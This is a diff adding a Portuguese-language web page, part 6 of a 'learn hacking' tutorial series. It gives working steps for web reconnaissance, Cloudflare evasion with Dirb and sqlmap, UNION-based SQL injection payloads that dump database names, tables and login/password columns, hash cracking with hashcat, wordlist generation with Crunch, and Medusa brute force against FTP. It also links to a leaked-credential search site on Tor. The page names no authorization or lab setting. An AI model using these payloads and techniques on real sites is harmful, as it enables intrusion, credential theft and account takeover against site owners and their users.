@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+    <head>
+        <meta charset="UTF-8"/>
+        <link rel="icon" href="_imagens/favicon.ico"/>
+        <title>Aprenda Hacking</title>
+        <link rel="stylesheet" href="_css/estilo.css"/>
+    </head>
+    <body>
+        <div>
+            <header>
+                <h1>Aprenda Hacking</h1>
+                <menu>
+                    <li><a href="index.html">Página Inicial</a></li>
+                    <li><a href="contato.html">Contato!</a></li>
+                    <li><a href="tudo-sobre-hacking-1.html">Tudo sobre Hacking Parte 1!</a></li>
+                    <li><a href="tudo-sobre-hacking-2.html">Tudo sobre Hacking Parte 2!</a></li>
+                    <li><a href="tudo-sobre-hacking-3.html">Tudo sobre Hacking Parte 3!</a></li>
+                    <li><a href="tudo-sobre-hacking-4.html">Tudo sobre Hacking Parte 4!</a></li>
+                    <li><a href="tudo-sobre-hacking-5.html">Tudo sobre Hacking Parte 5!</a></li>
+                    <li><a href="tudo-sobre-hacking-6.html" onclick="alert('Você já Está na Matéria desse Link!'); return false">Tudo sobre Hacking Parte 6!</a></li>
+                    <li><a href="tudo-sobre-hacking-7.html">Tudo sobre Hacking Parte 7!</a></li>
+                    <li><a href="tudo-sobre-hacking-8.html">Tudo sobre Hacking Parte 8!</a></li>
+                </menu>
+            </header>
+            
+<h2>Tudo sobre Hacking Parte 6</h2>
+
+<h3>Reconhecimento Web e Vulnerabilidades</h3>
+
+<p>Tendo as informações sobre o site, como o domínio, o IP e etc., podemos saber algumas coisas, por exemplo, que o IP real do servidor não tem como descobrirmos por ele estar protegido por um firewall, e é este IP que é pego, mas se o site estiver configurado incorretamente, pode vazar o IP real.</p>
+
+<p>Podemos achar pastas administrativas através do arquivo robots.txt (como a pasta /admin). E já podemos saber os serviços que estão rodando nesse servidor (como HTTP, HTTPS, SSH, FTP, etc.).</p>
+
+<p>Entrando no site, devemos olhar a estrutura do site, se as pastas administrativas e o robots.txt estão disponíveis, e podemos também fazer o Google Hacking nele (como <code>site:nomedosite.com.br</code>).</p>
+
+<p>No código-fonte do site, podemos olhar o banco de dados do site, por exemplo, tirar o link de uma foto para ver se tem pastas abertas disponíveis no servidor, e dados como servidor, sistema operacional e portas abertas (por exemplo, Apache 2.4.7 Ubuntu port 80).</p>
+
+<p>Podemos ver se ao clicar num arquivo inexistente se ele dá um erro como o Not Found (padrão do Apache) ou se exibe um erro personalizado.</p>
+
+<p>Podemos ver se tem algum erro, como algum código PHP não colocado no lugar certo.</p>
+
+<p>Podemos procurar itens não-indexados com essas pastas abertas digitando <code>intitle:"Index of"</code>. Podemos colocar outros parâmetros como <code>site:.com.br</code> e etc.</p>
+
+<p>No inspencionar elemento, em Network, podemos olhar as opções de rede do protocolo HTTP, vendo os arquivos carregados e os códigos das páginas (como 200, que é de sem erros, 304, que é de arquivo no cache do navegador ou 404, que é não encontrado).</p>
+
+<p>No headers está o cabeçalho HTTP, que é a forma que usamos para contatar o servidor HTTP, nele tem o Request Headers (requisições, como a identificação do nosso navegador, sistema operacional, referência que é o link de onde viemos, cookies, etc. para o site) e Response Headers (respostas, que é a identificação do sistema operacional do site, servidor, firewall, versão do PHP, etc.).</p>
+
+<p>No terminal, digitamos <code>nc nomedosite.com 80</code> e escrevemos alguma coisa pra vermos a resposta dele, essa resposta é o Response Header, pode ver que ele retorna com o erro 400 (bad request). Agora repita o comando mas dessa vez digite <code>GET / HTTP/1.0</code>, ele poderá (ou não) retornar outro erro. Podemos ir no navegador, em Network e Headers e copie as duas primeiras linhas do Request Headers (Host e User-Agent) e faça o mesmo procedimento, sem esquecer de digitar o código GET / HTTP/1.0 antes. O firewall Couldflare verifica se é um navegador verdadeiro através com Javascript, portanto, não dá pra burlar ele pelo terminal. Então tente copiando o Request Header todo. Depois tire o Accept-Encoding, Referer, Connection e Cache-Control e tente o processo novamente.</p>
+
+<p>Podemos usar no Kali o programa Dirb para fazer o bruteforce de pastas no site, usando esses comandos:</p>
+
+<pre>
+<code>
+dirb http://nomedosite.com -v
+</code>
+</pre>
+
+<p>O que retornar code <q>200</q> é o que existe, os inexistentes retornarão <q>404</q>.</p>
+
+<p>Só que o cloudflare não deixará rodar o Dirb e retornarão erros das pastas.</p>
+
+<p>Para passar o agent do site fazemos assim:</p>
+
+<pre>
+<code>
+dirb http://nomedosite.com -v -a "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:67.0) Gecko/20100101 Firefox/67.0"
+</code>
+</pre>
+
+<h3>Explorando SQL Injection e Bypass Cloudflare</h3>
+
+<p>Nesse ponto, podemos ter colhido várias informações como e-mail, subdomínios, servidor, etc., agora veremos se ele é vulnerável a SQL Injection</p>
+
+<p>Se o link tem, por exemplo <code>id=1</code>, podemos trocar o número por uma aspas simples para ver se retorna um erro, caso o erro seja SQL Syntax, ele está vulnerável a SQL Injection e podemos obter algumas informações nessa mensagem, como o tipo de banco de dados, como MySQL.</p>
+
+<p>Para entendermos como funciona isso, ao colocar 1 na ID, o site busca no banco de dados o cadastro equivalente à essa id, ao passar algo diferente, ele retornará um erro.</p>
+
+<p>No parâmetro da URL vamos digitar esses comandos:</p>
+
+<pre>
+<code>
+1 order by 1;--
+
+1 order by 2;--
+
+1 order by 3;--
+
+1 order by 4;--
+
+1 union select 1;--
+
+1 union select 1, 2, 3;--
+
+1 union select 1, 2, 3, 4;--
+</code>
+</pre>
+
+<p>PS: O 1 é o padrão da URL a ser unida.</p>
+
+<p>Digite esses comandos:</p>
+
+<pre>
+<code>
+-- Isso é pra ver quantas colunas tem na tabela, aumente ou diminua os números se necessário.
+
+-1 union select 1, 2, 3;--
+
+-1 union select 1, 2, 'aaa';--
+
+-- O comando database() retorna o nome do banco atual
+
+-1 union select 1, 2, database();--
+
+-1 union select 1, 2, schema_name from information_schema.schemata;--
+
+-- Retorna os nomes dos bancos de dados
+
+-1 union select 1, 2, group_concat(schema_name) from information_schema.schemata;--
+
+-- Retorna os nomes das tabelas do banco especificado.
+
+-1 union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema = 'nomedobanco';--
+
+-- Retorna os nomes das colunas das tabela especificada
+
+-1 union select 1, 2, group_concat(column_name) from information_schema.columns where table_schema = 'nomedobanco' and table_name = 'nomedatabela';--
+
+-1 union select 1, 2, group_concat(id, ' - ', login, ' - ', password) from nomedobanco.nomedatabela;--
+</code>
+</pre>
+
+<p>PS: O information_schema é um banco padrão do MySQL, que contém os nomes de todos os banco disponíveis.</p>
+
+<p>Nesse ponto já teríamos descoberto os dados de administração.</p>
+
+<p>Só que assim ainda não podemos logar no sistema, apesar do login estar disponível pra nós, a senha é guardada criptografada, geralmente como hash, que podem ser descobertos os textos planos que as geraram através de técnicas como rainbow tables. As senhas mais fáceis costumam ter hashs disponíveis nessas tabelas e conseguimos descobrir o que o o hash significa.</p>
+
+<p>Um desses sites para quebrarmos hashs de senhas é esse: <a href="https://hashes.com/" target="_blank">https://hashes.com/</a></p>
+
+<p>No caso, descobrirmos que o hash <code>21232f297a57a5a743894a0e4a801fc3</code> significa "admin". Aí podemos ter acesso ao site.</p>
+
+<p>Podemos também usar o SQLMap para isso, veja como usar:</p>
+
+<pre>
+<code>
+sqlmap -u http://nomedosite.com?cat=1 --dbs --dbms=mysql
+</code>
+</pre>
+
+<p>O Cloudflare bloqueará o ataque por SQLMap, então teremos que colocar o header nele, primeiro salve o header request do site num arquivo.txt e deixe ele dessa forma:</p>
+
+<pre>
+<code>
+GET /cat.php?id=3
+Host: nomedosite.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:67.0) Gecko/20100101 Firefox/67.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Cookie: __cfduid=d8ce2aad5dc68ea26fbd8852e171f6f3a1559013664; cf_clearance=c625db6a51ad635e6740e678245c4ee83a17504f-1559085911-3600-150; PHPSESSID=5jje5so5retpr7s3uhm1saadu2
+</code>
+</pre>
+
+<p>Digite no terminal esses comandos:</p>
+
+<pre>
+<code>
+sqlmap -r headers.txt --dbs --dbms=mysql
+</code>
+</pre>
+
+<p>Daí é só usar os comandos que usaríamos para descobrir tabelas, colunas e etc.</p>
+
+<h3>Descobrindo Senhas com o HashCat</h3>
+
+<p>Como sabemos, as senhas são guardados no banco de dados no formato de hash, e podemos usar geradores de hash para criptografar as mesmas.</p>
+
+<p>Para descobrir senhas usaremos o HashCat. Nativo no Kali Linux, ele pode ser instalado em outras distros com <code>sudo apt install hashcat ocl-icd-libopencl1 opencl-headers clinfo   beignet-opencl-icd mesa-opencl-icd lsb-core</code>.</p>
+
+<p>Salve um arquivo com o nome hashes.txt com os hashs desejados. Podemos baixar um exemplo <a href="_files/hashes.txt" target="_blank">aqui</a>!</p>
+
+<p>Para utilizar o hashcat, use na sintaxe <code>hashcat -a 0 -m 100 hashes.txt wordlist.txt</code>. No lugar do arquivo dos hashs podemos colocar o mesmo literalmente.</p>
+
+<p>Se você receber um erro de "exceção de comprimento de linha" no hashcat, geralmente é porque o modo hash que você solicitou não corresponde ao hash.</p>
+
+<p>Esses são os tipos de hashs: <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank">https://hashcat.net/wiki/doku.php?id=example_hashes</a></p>
+
+<p>Eles devem ser usados após o parâmetro -m, para MD5 o número é 0, SHA-1 o número é 100 e SHA-256 é 1400.</p>
+
+<p>O parâmetro -a indica o tipo de ataque, onde 0 é com wordlist, para fazer com bruteforce é 3, por exemplo:</p>
+
+<pre>
+<code>
+sudo hashcat -a 3 -m 0 hashes.txt ????????
+</code>
+</pre>
+
+<p>Onde está ? é o tipo de caractere e sua quantidade, onde a interrogação é o coringa pra todos, os tipos de caracteres podem ser vistos dando um --help no hashcat.</p>
+
+<p>PS: Em quaisquer casos, pode ser necessário forçar com <code>--force</code>, e também executar como root.</p>
+
+<p>Aqui temos outras dicas com outros tipos de hash: <a href="https://infosecwriteups.com/cracking-hashes-with-hashcat-2b21c01c18ec" target="_blank">https://infosecwriteups.com/cracking-hashes-with-hashcat-2b21c01c18ec</a></p>
+
+<h3>Gerando Wordlists com Crunch</h3>
+
+<p>Para gerar wordlists com o Crunch, utilizamos a sintaxe <code>crunch tam_min tam_max caracteres</code>. Isso gerará uma wordlist de tamanhos especificados, por exemplo:</p>
+
+<pre>
+<code>
+crunch 4 8 123 # Gerará senhas de 4 a 8 caracteres com 1, 2 e 3 e mostrará na tela
+
+crunch 4 8 123 -o wordlist.txt # Da mesma forma, só que guardará num arquivo txt.
+</code>
+</pre>
+
+<p>Veja um exemplo pra gerar a lista com senhas começando com "admin" e mais 3 caracteres, que no caso serão números que substituirão os "@":</p>
+
+<pre>
+<code>
+crunch 8 8 0123456789 -t admin@@@ -o wordlist-admin.txt
+</code>
+</pre>
+
+<p>PS: Caso o arquivo txt já exista, ele sobreescrevá o mesmo. Para juntar mais de uma wordlist no Linux, faça assim:</p>
+
+<pre>
+<code>
+cat wordlist-admin.txt wordlist-root.txt>>wordlist-completa.txt
+</code>
+</pre>
+
+<p>Podemos também criar wordlists com caracteres padrões do crunch, por exemplo:</p>
+
+<pre>
+<code>
+crunch 3 5 -f /usr/share/crunch/charset.lst mixalpha
+</code>
+</pre>
+
+<p>O <code>mixalpha</code> é pra misturar letras maiúsculas e minúsculas. As opções a serem usadas ali são essas:</p>
+
+<table>
+    <tr>
+        <th>Comando</th>
+        <th>Significado</th>
+    </tr>
+    <tr>
+        <td>lalpha</td>
+        <td>Apenas Letras Minúsculas</td>
+    </tr>
+    <tr>
+        <td>ualpha</td>
+        <td>Apenas Letras Maiúsculas</td>
+    </tr>
+    <tr>
+        <td>lalpha-numeric</td>
+        <td>Letras Minúsculas e Números</td>
+    </tr>
+    <tr>
+        <td>ualpha-numeric</td>
+        <td>Letras Maiúsculas e Números</td>
+    </tr>
+    <tr>
+        <td>lalpha-numeric-all-space</td>
+        <td>Letras Minúsculas, Números, Espaço e Caracteres Especiais</td>
+    </tr>
+    <tr>
+        <td>ualpha-numeric-all-space</td>
+        <td>Letras Maiúsculas, Números, Espaço e Caracteres Especiais</td>
+    </tr>
+    <tr>
+        <td>mixalpha</td>
+        <td>Letras Maiúsculas e Minúsculas</td>
+    </tr>
+    <tr>
+        <td>miaxalpha-numeric-all-space</td>
+        <td>Letras Maiúsculas e Minúsculas, Números, Espaço e Caracteres Especiais</td>
+    </tr>
+</table>
+
+<h3>Ataque com Medusa</h3>
+
+<p>Com uma wordlist pronta podemos atacar usando uma ferramenta como a Medusa. Basicamente o comando dele é <code>medusa -h hostouip -u nomedousuario -P wordlist -M protocolo</code>, por exemplo:</p>
+
+<pre>
+<code>
+medusa -h 10.10.10.123 -u admin -P wordlist.txt -M ftp
+</code>
+</pre>
+
+<p>No caso acima, com FTP, após ele descobrir a senha, podemos digitar <code>ftp 10.10.10.123 senha</code>.</p>
+
+<h3>Consulta de Senhas na Deep Web</h3>
+
+<p>Os dois sites da Deep Web que contém zilhões de e-mails e senhas vazados, são esses:</p>
+
+<ul>
+    <li><a href="http://pwndb2am4tzkvold.tor2web.xyz" target="_blank">http://pwndb2am4tzkvold.tor2web.xyz</a></li>
+    <li><a href="http://pwndb2am4tzkvold.onion" target="_blank">http://pwndb2am4tzkvold.onion</a></li>
+</ul>
+
+<p>Abra o Tor e acesse o segundo site especificado. Você pode realizar a pesquisa por um e-mail específico, domínio ou senha. O caractere "%" é um caractere coringa, no caso, e no e-mail e domínio, podemos usar "like" para parecido ou "=" para o termo exato (semelhante as pesquisas em SQL).</p>
+
+<ul>
+    <li><a href="tudo-sobre-hacking-5.html">Parte Anterior da Matéria!</a></li>
+    <li><a href="tudo-sobre-hacking-7.html">Continuação da Matéria!</a></li>
+</ul>
+        </div>
+    </body>
+</html>
